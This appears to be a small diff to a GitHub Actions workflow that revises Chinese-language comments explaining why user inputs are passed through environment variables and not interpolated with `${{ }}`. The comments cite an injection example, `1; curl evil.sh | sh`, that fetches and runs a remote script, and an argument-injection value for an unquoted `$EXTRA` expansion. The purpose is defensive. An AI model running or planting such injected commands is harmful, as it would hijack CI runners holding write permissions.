@@ -72,7 +72,7 @@ jobs:
 
       # 輸入一律走 env，不直接內插進 run 的 shell body。
       #
-      # `${{ }}` 是在 shell 看到這段文字**之前**就被展開的——等於把使用者打的字
+      # `${{ inputs.code }}` 這種寫法是在 shell 看到這段文字**之前**就被展開的——等於把使用者打的字
       # 直接貼進腳本裡。一個 `1; curl evil.sh | sh` 就會在這台握有
       # contents: write 的 runner 上執行。走 env 之後那些字只是變數的值，
       # 再怎麼寫都只是一串字元。
@@ -98,7 +98,7 @@ jobs:
             esac
           fi
           # 這兩個和 CODE 一樣是使用者從手機填進來的自由文字，而下面是
-          # **未加引號**的 `$EXTRA` 展開。不是 RCE（沒有 eval，${{ }} 已經走
+          # **未加引號**的 `$EXTRA` 展開。不是 RCE（沒有 eval，那幾個 input 已經走
           # env），但它能改寫後面所有的參數，實測：
           #
           #   price_buy='3200 --years 99'
